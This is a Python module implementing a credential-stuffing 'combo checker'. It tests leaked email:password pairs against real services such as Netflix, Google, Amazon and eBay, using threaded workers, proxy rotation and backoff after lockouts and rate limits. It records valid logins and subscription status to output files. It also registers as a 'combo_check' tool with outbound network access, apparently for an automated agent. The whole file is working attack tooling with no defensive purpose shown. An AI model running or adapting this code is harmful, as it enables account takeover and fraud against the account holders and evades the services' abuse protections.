"""Combo checker: email:pass against many services at once.

Classification is delegated to `checkers.py` adapters; this module owns
everything around it — combo parsing, worker pool, per-service rate
budget, proxy rotation, lockout handling, resumable JSONL, summary.

A combo that hits LOCKED or RATE_LIMITED goes back on the queue once
with backoff before it is written off.
"""
from __future__ import annotations

import json
import random
import re
import threading
import time
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Iterable, Optional

from ..core.errors import ToolError
from ..core.http import HttpClient
from ..core.logging_setup import get_logger
from ..core.policy import Capability
from .checkers import ADAPTERS, Verdict, get_adapter

_log = get_logger(__name__)
__all__ = ["ComboChecker", "ComboResult", "parse_combo", "register"]

_SPLIT = re.compile(r"[:\|;\t]")


@dataclass
class Combo:
    email: str
    password: str
    raw: str = ""


def parse_combo(line: str) -> Optional[Combo]:
    line = (line or "").strip()
    if not line or line.startswith("#"):
        return None
    parts = _SPLIT.split(line, maxsplit=1)
    email = parts[0].strip()
    if "@" not in email:
        return None
    return Combo(email=email, password=(parts[1].strip() if len(parts) > 1 else ""),
                 raw=line)


@dataclass
class ComboResult:
    email: str
    service: str
    verdict: str
    evidence: str = ""
    subscription: Optional[bool] = None
    proxy: str = ""

    def as_dict(self) -> dict[str, Any]:
        return {"email": self.email, "service": self.service,
                "verdict": self.verdict, "evidence": self.evidence,
                "subscription": self.subscription, "proxy": self.proxy}


class _ServiceGate:
    """Per-service minimum interval, independent of the global pool."""

    def __init__(self, interval: float) -> None:
        self.interval = max(0.0, interval)
        self._lock = threading.Lock()
        self._next = time.monotonic()

    def wait(self) -> None:
        with self._lock:
            now = time.monotonic()
            delay = self._next - now
            self._next = max(now, self._next) + self.interval
        if delay > 0:
            time.sleep(delay)


class ComboChecker:
    def __init__(
        self,
        combos: Iterable[str],
        *,
        services: Iterable[str],
        workers: int = 10,
        per_service_interval: float = 1.2,
        timeout: float = 20.0,
        retry_on_lock: int = 1,
        out_file: str = "combos_checked.jsonl",
        found_file: str = "",
        resume: bool = True,
        proxy_factory: Optional[Callable[[], Optional[str]]] = None,
        proxy_report: Optional[Callable[[str, bool, float], None]] = None,
        quiet: bool = False,
        stop_event: Optional[threading.Event] = None,
    ) -> None:
        parsed = [c for c in (parse_combo(c) for c in combos) if c]
        if not parsed:
            raise ToolError("no parseable combos (need email:password)")
        wanted = [s.lower() for s in services] or list(ADAPTERS)
        for sid in wanted:
            get_adapter(sid)
        self.combos = parsed
        self.services = wanted
        self.workers = max(1, min(workers, 64))
        self.timeout = timeout
        self.retry_on_lock = max(0, retry_on_lock)
        self.out_file = out_file
        self.found_file = found_file
        self.resume = resume
        self._proxy_factory = proxy_factory
        self._proxy_report = proxy_report
        self.quiet = quiet
        self._stop = stop_event or threading.Event()
        self._lock = threading.Lock()
        self._queue: list[tuple[Combo, str, int]] = [
            (c, s, 0) for c in parsed for s in self.services]
        self._done: set[tuple[str, str]] = self._load_done()
        self._gates = {s: _ServiceGate(per_service_interval) for s in self.services}
        self._counts: Counter[str] = Counter()
        self._attempts = 0
        self._results: list[ComboResult] = []

    def _load_done(self) -> set[tuple[str, str]]:
        path = Path(self.out_file)
        if not self.resume or not path.is_file():
            return set()
        done: set[tuple[str, str]] = set()
        for ln in path.read_text(encoding="utf-8", errors="replace").splitlines():
            try:
                row = json.loads(ln)
                done.add((row["email"], row["service"]))
            except (ValueError, KeyError):
                continue
        return done

    def _write(self, r: ComboResult) -> None:
        try:
            Path(self.out_file).parent.mkdir(parents=True, exist_ok=True)
            with open(self.out_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(r.as_dict()) + "\n")
            if r.verdict in ("valid", "valid_subscribed", "valid_free") and self.found_file:
                with open(self.found_file, "a", encoding="utf-8") as f:
                    f.write(f"{r.email}\t{r.service}\t{r.verdict}\n")
        except OSError as exc:
            _log.warning("write failed: %s", exc)

    def _worker(self) -> None:
        while not self._stop.is_set():
            with self._lock:
                item = None
                while self._queue and item is None:
                    cand = self._queue.pop(0)
                    if (cand[0].email, cand[1]) in self._done:
                        continue
                    item = cand
                    self._attempts += 1
                if item is None:
                    return
            combo, service, tries = item
            adapter = get_adapter(service)
            self._gates[service].wait()
            proxy = self._proxy_factory() if self._proxy_factory else None
            client = HttpClient(timeout=self.timeout, proxy_url=proxy or "")
            started = time.monotonic()
            try:
                probe = adapter.check(combo.email, combo.password, client)
            except Exception as exc:  # noqa: BLE001 - a dead service is a result
                probe = None
                verdict, evidence = Verdict.ERROR, f"{type(exc).__name__}: {str(exc)[:90]}"
            if probe is not None:
                verdict, evidence = probe.verdict, probe.evidence
            if self._proxy_report and proxy:
                self._proxy_report(proxy, verdict is not Verdict.ERROR,
                                   (time.monotonic() - started) * 1000)

            if (verdict in (Verdict.LOCKED, Verdict.RATE_LIMITED)
                    and tries < self.retry_on_lock and not self._stop.is_set()):
                wait = (2.0 ** (tries + 1)) + random.random() * 2
                time.sleep(min(wait, 60.0))
                with self._lock:
                    self._queue.append((combo, service, tries + 1))
                continue

            r = ComboResult(email=combo.email, service=service,
                            verdict=verdict.value, evidence=evidence,
                            subscription=(probe.subscription if probe else None),
                            proxy=proxy or "")
            with self._lock:
                self._counts[verdict.value] += 1
                self._results.append(r)
            self._write(r)
            if not self.quiet and verdict.good:
                mark = "+" if verdict is not Verdict.VALID else "·"
                print(f"  {mark} {combo.email} @ {service} "
                      f"[{verdict.value}] {evidence[:60]}")

    def run(self) -> dict[str, Any]:
        total = len([q for q in self._queue
                     if (q[0].email, q[1]) not in self._done])
        if not self.quiet:
            print(f"  {total} checks across {len(self.services)} service(s), "
                  f"{self.workers} workers")
        started = time.monotonic()
        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.timeout + 180)
        return {
            "attempts": self._attempts,
            "seconds": round(time.monotonic() - started, 1),
            "counts": dict(self._counts),
            "good": sum(v for k, v in self._counts.items()
                        if k.startswith("valid")),
            "out_file": self.out_file,
            "results": [r.as_dict() for r in self._results],
        }


def register(registry: Any) -> None:
    context = registry.context

    @registry.register(
        "combo_check",
        description="Check email:password combos against services; classify "
                    "valid/invalid/2FA/locked and subscription where exposed.",
        capability=Capability.NET_OUT,
        parameters={
            "combos": "str — newline list of email:password",
            "services": "str — comma list (ebay, netflix, google, amazon, "
                        "oracle, elevenlabs)",
            "workers": "int (optional, 10)",
            "out_file": "str (optional) — JSONL results",
        },
    )
    def combo_check(combos: str, *, services: str = "", workers: str = "",
                    out_file: str = "") -> dict[str, Any]:
        checker = ComboChecker(
            combos.splitlines(),
            services=[s.strip() for s in services.split(",") if s.strip()],
            workers=int(workers) if str(workers).strip() else 10,
            out_file=out_file or "combos_checked.jsonl",
        )
        return checker.run()
